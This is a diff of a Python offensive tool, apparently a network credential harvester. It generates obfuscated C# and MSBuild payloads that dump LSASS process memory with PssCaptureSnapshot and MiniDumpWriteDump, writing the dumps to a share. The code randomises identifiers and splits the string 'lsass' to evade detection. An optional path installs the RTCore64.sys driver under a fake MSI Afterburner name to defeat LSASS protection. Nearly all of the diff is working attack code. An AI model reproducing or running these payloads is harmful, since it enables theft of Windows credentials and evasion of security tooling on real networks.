@@ -814,10 +814,303 @@ def do_ip(inpu, local_ip):  # check if the inputted ips are up so we dont scan t
     return uphosts
 
 
-def gen_payload_exe(share_name, payload_name, addresses_array):
+def gen_payload_exe(share_name, payload_name, addresses_array, drive_letter):
     addresses_file = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    PSS_CAPTURE_VA_CLONE = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    PSS_CAPTURE_HANDLES = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    PSS_CAPTURE_HANDLE_NAME_INFORMATION = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    PSS_CAPTURE_HANDLE_BASIC_INFORMATION = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    PSS_CAPTURE_HANDLE_TYPE_SPECIFIC_INFORMATION = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    PSS_CAPTURE_HANDLE_TRACE = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    PSS_CAPTURE_THREADS = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    PSS_CAPTURE_THREAD_CONTEXT = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    PSS_CREATE_MEASURE_PERFORMANCE = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    PSS_CAPTURE_FLAGS = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    MINIDUMP_CALLBACK_TYPE = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    MiniDumpSnapshot = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    MINIDUMP_CALLBACK_OUTPUT = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    MINIDUMP_CALLBACK_INFORMATION = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    Status = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    CallbackRoutine = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    CallbackParam = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    PSS_QUERY_INFORMATION_CLASS = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    PMINIDUMP_CALLBACK_INPUT = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    PMINIDUMP_CALLBACK_OUTPUT = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    PMINIDUMP_EXCEPTION_INFORMATION = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    PMINIDUMP_USER_STREAM_INFORMATION = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    PMINIDUMP_CALLBACK_INFORMATION = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    PSS_QUERY_VA_CLONE_INFORMATION = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    MINIDUMP_TYPE = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    MiniDumpWithDataSegs = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    MiniDumpWithFullMemory = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    MiniDumpWithHandleData = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    MiniDumpWithUnloadedModules = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    MiniDumpWithProcessThreadData = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    MiniDumpWithPrivateReadWriteMemory = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    MiniDumpWithFullMemoryInfo = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    MiniDumpWithThreadInfo = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    MiniDumpWithPrivateWriteCopyMemory = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    MiniDumpWithTokenInformation = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    MiniDumpWithModuleHeaders = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    sHandle = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    Program = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    lsass = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    h = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    pro = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    processid = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    hresult = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    CbackDelegate = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    CbackParam = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    obj = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    file = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    pointr = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    MFlag = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    VcHandle = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    cloneProid = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    lines = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    ipEntry = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    ip = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    i = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    thismachinesip = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
 
-    os.system('sudo cp {}/src/exepayload /var/tmp/{}/{}.exe'.format(cwd, share_name, payload_name))
+    exe_payload = ''
+    exe_payload += 'using System;\n'
+    exe_payload += 'using System.IO;\n'
+    exe_payload += 'using System.Linq;\n'
+    exe_payload += 'using System.ComponentModel;\n'
+    exe_payload += 'using System.Diagnostics;\n'
+    exe_payload += 'using System.Runtime.InteropServices;\n'
+    exe_payload += 'using DWORD = System.Int32;\n'
+    exe_payload += 'using BOOL = System.Int32;\n'
+    exe_payload += 'using HANDLE = System.IntPtr;\n'
+    exe_payload += 'using HPSS = System.IntPtr;\n'
+    exe_payload += 'using PVOID = System.IntPtr;\n'
+    exe_payload += 'using %s = System.IntPtr;\n' % (PMINIDUMP_CALLBACK_INPUT)
+    exe_payload += 'using %s = System.IntPtr;\n' % (PMINIDUMP_CALLBACK_OUTPUT)
+    exe_payload += 'using %s = System.IntPtr;\n' % (PMINIDUMP_EXCEPTION_INFORMATION)
+    exe_payload += 'using %s = System.IntPtr;\n' % (PMINIDUMP_USER_STREAM_INFORMATION)
+    exe_payload += 'using %s = System.IntPtr;\n' % (PMINIDUMP_CALLBACK_INFORMATION)
+
+    exe_payload += 'namespace %s\n' % (MiniDumpSnapshot)
+    exe_payload += '{\n'
+    exe_payload += '    internal enum %s : uint\n' % (MINIDUMP_CALLBACK_TYPE)
+    exe_payload += '    {\n'
+    exe_payload += '        ModuleCallback,\n'
+    exe_payload += '        ThreadCallback,\n'
+    exe_payload += '        ThreadExCallback,\n'
+    exe_payload += '        IncludeThreadCallback,\n'
+    exe_payload += '        IncludeModuleCallback,\n'
+    exe_payload += '        MemoryCallback,\n'
+    exe_payload += '        CancelCallback,\n'
+    exe_payload += '        WriteKernelMinidumpCallback,\n'
+    exe_payload += '        KernelMinidumpStatusCallback,\n'
+    exe_payload += '        RemoveMemoryCallback,\n'
+    exe_payload += '        IncludeVmRegionCallback,\n'
+    exe_payload += '        IoStartCallback,\n'
+    exe_payload += '        IoWriteAllCallback,\n'
+    exe_payload += '        IoFinishCallback,\n'
+    exe_payload += '        ReadMemoryFailureCallback,\n'
+    exe_payload += '        SecondaryFlagsCallback,\n'
+    exe_payload += '        IsProcessSnapshotCallback,\n'
+    exe_payload += '        VmStartCallback,\n'
+    exe_payload += '        VmQueryCallback,\n'
+    exe_payload += '        VmPreReadCallback,\n'
+    exe_payload += '    }\n'
+
+    exe_payload += '    struct %s\n' % (MINIDUMP_CALLBACK_OUTPUT)
+    exe_payload += '    {\n'
+    exe_payload += '        public int %s; \n' % (Status)
+    exe_payload += '    }\n'
+
+    exe_payload += '    internal struct %s\n' % (MINIDUMP_CALLBACK_INFORMATION)
+    exe_payload += '    {\n'
+    exe_payload += '        public IntPtr %s;\n' % (CallbackRoutine)
+    exe_payload += '        public PVOID %s;\n' % (CallbackParam)
+    exe_payload += '    }\n'
+    exe_payload += '    [Flags]\n'
+    exe_payload += '    internal enum %s : uint\n' % (PSS_CAPTURE_FLAGS)
+    exe_payload += '    {\n'
+    exe_payload += '        %s = 0x00000001,\n' % (PSS_CAPTURE_VA_CLONE)
+    exe_payload += '        %s = 0x00000004,\n' % (PSS_CAPTURE_HANDLES)
+    exe_payload += '        %s = 0x00000008,\n' % (PSS_CAPTURE_HANDLE_NAME_INFORMATION)
+    exe_payload += '        %s = 0x00000010,\n' % (PSS_CAPTURE_HANDLE_BASIC_INFORMATION)
+    exe_payload += '        %s = 0x00000020,\n' % (PSS_CAPTURE_HANDLE_TYPE_SPECIFIC_INFORMATION)
+    exe_payload += '        %s = 0x00000040,\n' % (PSS_CAPTURE_HANDLE_TRACE)
+    exe_payload += '        %s = 0x00000080,\n' % (PSS_CAPTURE_THREADS)
+    exe_payload += '        %s = 0x00000100,\n' % (PSS_CAPTURE_THREAD_CONTEXT)
+    exe_payload += '        %s = 0x40000000,\n' % (PSS_CREATE_MEASURE_PERFORMANCE)
+    exe_payload += '    }\n'
+
+    exe_payload += '    internal enum %s\n' % (PSS_QUERY_INFORMATION_CLASS)
+    exe_payload += '    {\n'
+    exe_payload += '        %s = 1,\n' % (PSS_QUERY_VA_CLONE_INFORMATION)
+    exe_payload += '    }\n'
+
+    exe_payload += '    [Flags]\n'
+    exe_payload += '    internal enum %s : int\n' % (MINIDUMP_TYPE)
+    exe_payload += '    {\n'
+    exe_payload += '        %s = 0x00000001,\n' % (MiniDumpWithDataSegs)
+    exe_payload += '        %s = 0x00000002,\n' % (MiniDumpWithFullMemory)
+    exe_payload += '        %s = 0x00000004,\n' % (MiniDumpWithHandleData)
+    exe_payload += '        %s = 0x00000020,\n' % (MiniDumpWithUnloadedModules)
+    exe_payload += '        %s = 0x00000100,\n' % (MiniDumpWithProcessThreadData)
+    exe_payload += '        %s = 0x00000200,\n' % (MiniDumpWithPrivateReadWriteMemory)
+    exe_payload += '        %s = 0x00000800,\n' % (MiniDumpWithFullMemoryInfo)
+    exe_payload += '        %s = 0x00001000,\n' % (MiniDumpWithThreadInfo)
+    exe_payload += '        %s = 0x00010000,\n' % (MiniDumpWithPrivateWriteCopyMemory)
+    exe_payload += '        %s = 0x00040000,\n' % (MiniDumpWithTokenInformation)
+    exe_payload += '        %s = 0x00080000,\n' % (MiniDumpWithModuleHeaders)
+    exe_payload += '    }\n'
+
+    exe_payload += '    [UnmanagedFunctionPointer(CallingConvention.StdCall)]\n'
+    exe_payload += '    internal delegate BOOL MiniDumpCallback(PVOID %s, %s CallbackInput, %s CallbackOutput);\n' % (CallbackParam, PMINIDUMP_CALLBACK_INPUT, PMINIDUMP_CALLBACK_OUTPUT)
+    exe_payload += '    class %s\n' % (Program)
+    exe_payload += '    {\n'
+    exe_payload += '        [DllImport("dbghelp")]\n'
+    exe_payload += '        internal static extern DWORD MiniDumpWriteDump(HANDLE hProcess, DWORD ProcessId, HANDLE hFile, %s DumpType, %s ExceptionParam, %s UserStreamParam, %s %s);\n' % (MINIDUMP_TYPE, PMINIDUMP_EXCEPTION_INFORMATION, PMINIDUMP_USER_STREAM_INFORMATION, PMINIDUMP_CALLBACK_INFORMATION, CallbackParam)
+
+    exe_payload += '        internal static BOOL MiniDumpCallbackMethod(PVOID parameter, %s inp, %s op)\n' % (PMINIDUMP_CALLBACK_INPUT, PMINIDUMP_CALLBACK_OUTPUT)
+    exe_payload += '        {\n'
+    exe_payload += '            unsafe\n'
+    exe_payload += '            {\n'
+    exe_payload += '                if (Marshal.ReadByte(inp + sizeof(int) + IntPtr.Size) == (int)%s.IsProcessSnapshotCallback)\n' % (MINIDUMP_CALLBACK_TYPE)
+    exe_payload += '                {\n'
+    exe_payload += '                    var %s = (%s*)op;\n' % (obj, MINIDUMP_CALLBACK_OUTPUT)
+    exe_payload += '                    %s->%s = 1;\n' % (obj, Status)
+    exe_payload += '                }\n'
+    exe_payload += '           }\n'
+
+    exe_payload += '            return 1;\n'
+    exe_payload += '        }\n'
+
+    exe_payload += '        [DllImport("kernel32")]\n'
+    exe_payload += '        internal static extern DWORD PssQuerySnapshot(HPSS SnapshotHandle, %s InformationClass, out IntPtr Buffer, DWORD BufferLength);\n' % (PSS_QUERY_INFORMATION_CLASS)
+
+    exe_payload += '        [DllImport("kernel32")]\n'
+    exe_payload += '        internal static extern DWORD PssCaptureSnapshot(HANDLE ProcessHandle, %s CaptureFlags, DWORD ThreadContextFlags, out HPSS SnapshotHandle);\n' % (PSS_CAPTURE_FLAGS)
+
+    exe_payload += '        [DllImport("kernel32")]\n'
+    exe_payload += '        internal static extern DWORD PssFreeSnapshot(HANDLE ProcessHandle, HPSS SnapshotHandle);\n'
+
+    exe_payload += '        [DllImport("kernel32")]\n'
+    exe_payload += '        internal static extern BOOL CloseHandle(HANDLE hObject);\n'
+
+    exe_payload += '        [DllImport("kernel32")]\n'
+    exe_payload += '        internal static extern BOOL GetProcessId(HANDLE hObject);\n'
+
+    exe_payload += '        static int Main(string[] args)\n'
+    exe_payload += '        {\n'
+
+    exe_payload += '            Process[] %s = Process.GetProcessesByName("l"+"s"+"as"+"s");\n' % (lsass)
+    exe_payload += '            int %s = %s[0].Id;\n' % (processid, lsass)
+    exe_payload += '            HANDLE %s;\n' % (h)
+    exe_payload += '            try\n'
+    exe_payload += '            {\n'
+    exe_payload += '                var %s = Process.GetProcessById(%s);\n' % (pro, processid)
+    exe_payload += '                %s = %s.Handle;\n' % (h, pro)
+    exe_payload += '            }\n'
+    exe_payload += '            catch (ArgumentException)\n'
+    exe_payload += '           {\n'
+    exe_payload += '                Console.WriteLine("Process does not exist");\n'
+    exe_payload += '                return -2;\n'
+    exe_payload += '            }\n'
+
+    exe_payload += '            var flags = %s.%s |\n' % (PSS_CAPTURE_FLAGS, PSS_CAPTURE_VA_CLONE)
+    exe_payload += '                        %s.%s |\n' % (PSS_CAPTURE_FLAGS, PSS_CAPTURE_HANDLES)
+    exe_payload += '                        %s.%s |\n' % (PSS_CAPTURE_FLAGS, PSS_CAPTURE_HANDLE_NAME_INFORMATION)
+    exe_payload += '                        %s.%s |\n' % (PSS_CAPTURE_FLAGS, PSS_CAPTURE_HANDLE_BASIC_INFORMATION)
+    exe_payload += '                        %s.%s |\n' % (PSS_CAPTURE_FLAGS, PSS_CAPTURE_HANDLE_TYPE_SPECIFIC_INFORMATION)
+    exe_payload += '                        %s.%s |\n' % (PSS_CAPTURE_FLAGS, PSS_CAPTURE_HANDLE_TRACE)
+    exe_payload += '                        %s.%s |\n' % (PSS_CAPTURE_FLAGS, PSS_CAPTURE_THREADS)
+    exe_payload += '                        %s.%s |\n' % (PSS_CAPTURE_FLAGS, PSS_CAPTURE_THREAD_CONTEXT)
+    exe_payload += '                        %s.%s;\n' % (PSS_CAPTURE_FLAGS, PSS_CREATE_MEASURE_PERFORMANCE)
+
+    exe_payload += '            HPSS %s;\n' % (sHandle)
+
+    exe_payload += '            DWORD %s = PssCaptureSnapshot(%s, flags, IntPtr.Size == 8 ? 0x0010001F : 0x0001003F, out %s);\n' % (hresult, h, sHandle)
+
+    exe_payload += '            if (%s != 0)\n' % (hresult)
+    exe_payload += '            {\n'
+    exe_payload += '                Console.WriteLine("Snapshot failed :( ({%s})");\n' % (hresult)
+    exe_payload += '                return %s;\n' % (hresult)
+    exe_payload += '            }\n'
+
+    exe_payload += '                var %s = System.IO.File.ReadLines("%s:\\\\%s.txt").ToArray();\n' % (lines, drive_letter, addresses_file)
+    exe_payload += '                string %s = "";\n' % (thismachinesip)
+    exe_payload += '                var %s = System.Net.Dns.GetHostEntry(System.Net.Dns.GetHostName());\n' % (ipEntry)
+    exe_payload += '                foreach (var %s in %s.AddressList)\n' % (ip, ipEntry)
+    exe_payload += '                {\n'
+    exe_payload += '                    for (int %s = 0; %s < %s.Length; %s++)\n' % (i, i, lines, i)
+    exe_payload += '                    {\n'
+    exe_payload += '                        if (%s.ToString() == %s[%s].ToString())\n' % (ip, lines, i)
+    exe_payload += '                        {\n'
+    exe_payload += '                            %s = "-" + %s.ToString();\n' % (thismachinesip, ip)
+    exe_payload += '                        }\n'
+    exe_payload += '                    }\n'
+    exe_payload += '                }\n'
+
+    exe_payload += '            using (var %s = new FileStream("%s:\\\\" + System.Net.Dns.GetHostName() + %s + ".dmp", FileMode.Create))\n' % (file, drive_letter, thismachinesip)
+    exe_payload += '            {\n'
+    exe_payload += '                var %s = new MiniDumpCallback(MiniDumpCallbackMethod);\n' % (CbackDelegate)
+    exe_payload += '                var %s = Marshal.AllocHGlobal(IntPtr.Size * 2);\n' % (CbackParam)
+
+    exe_payload += '                unsafe\n'
+    exe_payload += '                {\n'
+    exe_payload += '                    var %s = (%s*)%s;\n' % (pointr, MINIDUMP_CALLBACK_INFORMATION, CbackParam)
+    exe_payload += '                    %s->%s = Marshal.GetFunctionPointerForDelegate(%s);\n' % (pointr, CallbackRoutine, CbackDelegate)
+    exe_payload += '                    %s->%s = IntPtr.Zero;\n' % (pointr, CallbackParam)
+    exe_payload += '                }\n'
+
+    exe_payload += '                var %s = %s.%s |\n' % (MFlag, MINIDUMP_TYPE, MiniDumpWithDataSegs)
+    exe_payload += '                                    %s.%s |\n' % (MINIDUMP_TYPE, MiniDumpWithTokenInformation)
+    exe_payload += '                                    %s.%s |\n' % (MINIDUMP_TYPE, MiniDumpWithPrivateWriteCopyMemory)
+    exe_payload += '                                    %s.%s |\n' % (MINIDUMP_TYPE, MiniDumpWithPrivateReadWriteMemory)
+    exe_payload += '                                    %s.%s |\n' % (MINIDUMP_TYPE, MiniDumpWithUnloadedModules)
+    exe_payload += '                                    %s.%s |\n' % (MINIDUMP_TYPE, MiniDumpWithFullMemory)
+    exe_payload += '                                    %s.%s |\n' % (MINIDUMP_TYPE, MiniDumpWithHandleData)
+    exe_payload += '                                    %s.%s |\n' % (MINIDUMP_TYPE, MiniDumpWithThreadInfo)
+    exe_payload += '                                    %s.%s |\n' % (MINIDUMP_TYPE, MiniDumpWithFullMemoryInfo)
+    exe_payload += '                                    %s.%s |\n' % (MINIDUMP_TYPE, MiniDumpWithProcessThreadData)
+    exe_payload += '                                    %s.%s;\n' % (MINIDUMP_TYPE, MiniDumpWithModuleHeaders)
+
+    exe_payload += '                %s = MiniDumpWriteDump(%s, %s, %s.SafeFileHandle.DangerousGetHandle(), %s, IntPtr.Zero, IntPtr.Zero, %s);\n' % (hresult, sHandle, processid, file, MFlag, CbackParam)
+
+    exe_payload += '                IntPtr %s;\n' % (VcHandle)
+    exe_payload += '                PssQuerySnapshot(%s, %s.%s, out %s, IntPtr.Size);\n' % (sHandle, PSS_QUERY_INFORMATION_CLASS, PSS_QUERY_VA_CLONE_INFORMATION, VcHandle)
+
+    exe_payload += '                var %s = GetProcessId(%s);\n' % (cloneProid, VcHandle)
+
+    exe_payload += '                PssFreeSnapshot(Process.GetCurrentProcess().Handle, %s);\n' % (sHandle)
+    exe_payload += '                CloseHandle(%s);\n' % (VcHandle)
+
+    exe_payload += '                try\n'
+    exe_payload += '                {\n'
+    exe_payload += '                    Process.GetProcessById(%s).Kill();\n' % (cloneProid)
+    exe_payload += '                }\n'
+    exe_payload += '                catch (Win32Exception)\n'
+    exe_payload += '                {\n'
+    exe_payload += '                }\n'
+
+    exe_payload += '                Marshal.FreeHGlobal(%s);\n' % (CbackParam)
+    exe_payload += '                GC.KeepAlive(%s);\n' % (CbackDelegate)
+
+    exe_payload += '                if (%s == 0)\n' % (hresult)
+    exe_payload += '                {\n'
+    exe_payload += '                    Console.WriteLine("MiniDumpWriteDump failed. ({Marshal.GetHRForLastWin32Error()})");\n'
+    exe_payload += '                    return %s;\n' % (hresult)
+    exe_payload += '                }\n'
+    exe_payload += '            }\n'
+
+    exe_payload += '            return 0;\n'
+    exe_payload += '        }\n'
+    exe_payload += '    }\n'
+    exe_payload += '}\n'
+
+    with open('/var/tmp/{}/pl.cs'.format(share_name), 'w') as f:
+        f.write(exe_payload)
+        f.close()
+
+    os.system('sudo mcs -out:/var/tmp/{}/{}.exe /var/tmp/{}/pl.cs -unsafe'.format(share_name, payload_name, share_name))
     os.system('sudo chmod uog+rx /var/tmp/{}/{}.exe'.format(share_name, payload_name))
 
     with open('/var/tmp/{}/{}.txt'.format(share_name, addresses_file), 'w') as f:
@@ -856,7 +1149,18 @@ def gen_payload_regsvr32(share_name, payload_name, addresses_array):
 def gen_payload_msbuild(share_name, payload_name, drive_letter, addresses_array, runasppl):
     targetname = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
     taskname = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
-    minidumpdll = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    MiniDumpWithDataSegs = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    MiniDumpWithFullMemory = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    MiniDumpWithHandleData = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    MiniDumpWithThreadInfo = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    MiniDumpWithTokenInformation = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(6, 25)))
+    filename = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    fs = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    bRet = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    dumpTyp = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    prochandle = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    procid = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    Dump = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
     GetMyPID = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
     myprocesses = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
     myprocess = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
@@ -877,7 +1181,6 @@ def gen_payload_msbuild(share_name, payload_name, drive_letter, addresses_array,
     ip = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
     i = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
     thismachinesip = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
-    returnedout = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
 
     xml_payload = "<Project ToolsVersion=\"4.0\" xmlns=\"http://schemas.microsoft.com/developer/msbuild/2003\">\n"
     xml_payload += "<!-- C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe SimpleTasks.csproj -->\n"
@@ -894,25 +1197,76 @@ def gen_payload_msbuild(share_name, payload_name, drive_letter, addresses_array,
     xml_payload += "              <![CDATA[\n"
     xml_payload += "using System; using System.Diagnostics; using System.Runtime.InteropServices; using System.Security.Principal; using System.Threading; using Microsoft.Build.Framework; using Microsoft.Build.Utilities; using System.IO; using System.Linq;\n"
     xml_payload += "public class %s : Task, ITask {\n" % (taskname)
-
-    xml_payload += "        [System.Runtime.InteropServices.DllImport(@\"%s:\\\\%s.dll\", EntryPoint = \"getthatdmp\", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]\n" % (drive_letter, minidumpdll)
-    xml_payload += "        static extern int getthatdmp(int pid, string output);\n"
-
+    xml_payload += "		public enum Typ : uint\n"
+    xml_payload += "        {\n"
+    xml_payload += "            %s = 0x00000001,\n" % (MiniDumpWithDataSegs)
+    xml_payload += "            %s = 0x00000002,\n" % (MiniDumpWithFullMemory)
+    xml_payload += "            %s = 0x00000004,\n" % (MiniDumpWithHandleData)
+    xml_payload += "            %s = 0x00001000,\n" % (MiniDumpWithThreadInfo)
+    xml_payload += "            %s = 0x00040000,\n" % (MiniDumpWithTokenInformation)
+    xml_payload += "        };\n"
     if runasppl:
         xml_payload += "        [System.Runtime.InteropServices.DllImport(@\"%s:\\\\%s.dll\", EntryPoint = \"runninit\", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]\n" % (drive_letter, RunAsPPLDll)
         xml_payload += "        static extern void runninit(string argus);\n"
 
+    xml_payload += "        [System.Runtime.InteropServices.DllImport(\"dbghelp.dll\",\n"
+    xml_payload += "              EntryPoint = \"MiniDumpWriteDump\",\n"
+    xml_payload += "              CallingConvention = CallingConvention.StdCall,\n"
+    xml_payload += "              CharSet = CharSet.Unicode,\n"
+    xml_payload += "              ExactSpelling = true, SetLastError = true)]\n"
+    xml_payload += "        static extern bool MiniDumpWriteDump(\n"
+    xml_payload += "              IntPtr hProcess,\n"
+    xml_payload += "              uint processId,\n"
+    xml_payload += "              IntPtr hFile,\n"
+    xml_payload += "              uint dumpType,\n"
+    xml_payload += "              IntPtr expParam,\n"
+    xml_payload += "              IntPtr userStreamParam,\n"
+    xml_payload += "              IntPtr callbackParam);\n"
 
-        xml_payload += "        public static int %s() {\n" % (GetMyPID)
-        xml_payload += "            var %s = System.Diagnostics.Process.GetProcessesByName(System.Diagnostics.Process.GetCurrentProcess().ProcessName);\n" % (myprocesses)
-        xml_payload += "            var %s = 0;\n" % (myid)
-        xml_payload += "            foreach (var %s in %s)\n" % (myprocess, myprocesses)
-        xml_payload += "            {\n"
-        xml_payload += "                %s = %s.Id;\n" % (myid, myprocess)
-        xml_payload += "            }\n"
+    xml_payload += "        public static bool %s(string %s, Typ %s, IntPtr %s, uint %s)\n" % (Dump, filename, dumpTyp, prochandle, procid)
+    xml_payload += "        {\n"
+    xml_payload += "            using (var %s = new System.IO.FileStream(%s, System.IO.FileMode.Create, System.IO.FileAccess.Write, System.IO.FileShare.None))\n" % (fs, filename)
+    xml_payload += "            {\n"
+    xml_payload += "                bool %s = MiniDumpWriteDump(\n" % (bRet)
+    xml_payload += "                  %s,\n" % (prochandle)
+    xml_payload += "                  %s,\n" % (procid)
+    xml_payload += "                  %s.SafeFileHandle.DangerousGetHandle(),\n" % (fs)
+    xml_payload += "                  (uint)%s,\n" % (dumpTyp)
+    xml_payload += "                  IntPtr.Zero,\n"
+    xml_payload += "                  IntPtr.Zero,\n"
+    xml_payload += "                  IntPtr.Zero);\n"
+    xml_payload += "                if (!%s)\n" % (bRet)
+    xml_payload += "                {\n"
+    xml_payload += "                    throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error());\n"
+    xml_payload += "                }\n"
+    xml_payload += "                return %s;\n" % (bRet)
+    xml_payload += "            }\n"
+    xml_payload += "        }\n"
 
-        xml_payload += "            return %s;\n" % (myid)
-        xml_payload += "        }\n"
+    xml_payload += "        public static int %s() {\n" % (GetMyPID)
+    xml_payload += "            var %s = System.Diagnostics.Process.GetProcessesByName(System.Diagnostics.Process.GetCurrentProcess().ProcessName);\n" % (myprocesses)
+    xml_payload += "            var %s = 0;\n" % (myid)
+    xml_payload += "            foreach (var %s in %s)\n" % (myprocess, myprocesses)
+    xml_payload += "            {\n"
+    xml_payload += "                %s = %s.Id;\n" % (myid, myprocess)
+    xml_payload += "            }\n"
+
+    xml_payload += "            return %s;\n" % (myid)
+    xml_payload += "        }\n"
+
+    xml_payload += "        public static int %s() {\n" % (GetPID)
+    xml_payload += "            string %s = \"s\";\n" % (s)
+    xml_payload += "            string %s = \"l\";\n" % (l)
+    xml_payload += "            string %s = \"a\";\n" % (a)
+    xml_payload += "            var %s = System.Diagnostics.Process.GetProcessesByName(%s + %s + %s + %s + %s);\n" % (processes, l, s, a, s, s)
+    xml_payload += "            var %s = 0;\n" % (id)
+    xml_payload += "            foreach (var %s in %s)\n" % (process, processes)
+    xml_payload += "            {\n"
+    xml_payload += "                %s = %s.Id;\n" % (id, process)
+    xml_payload += "            }\n"
+
+    xml_payload += "            return %s;\n" % (id)
+    xml_payload += "        }\n"
 
     xml_payload += "        public static bool %s()\n" % (IsAdministrator)
     xml_payload += "        {\n"
@@ -937,7 +1291,6 @@ def gen_payload_msbuild(share_name, payload_name, drive_letter, addresses_array,
     xml_payload += "                        }\n"
     xml_payload += "                    }\n"
     xml_payload += "                }\n"
-
     if runasppl:
         xml_payload += "                Process.Start(\"cmd.exe\", @\"/c \" + \"sc.exe create RTCore64 type=kernel start=auto binPath=%s:\\\\RTCore64.sys DisplayName=\\\"Micro - Star MSI Afterburner\\\"\").WaitForExit();\n" % (drive_letter)
         xml_payload += "                Thread.Sleep(1000);\n"
@@ -947,18 +1300,8 @@ def gen_payload_msbuild(share_name, payload_name, drive_letter, addresses_array,
         xml_payload += "                Thread.Sleep(1000);\n"
 
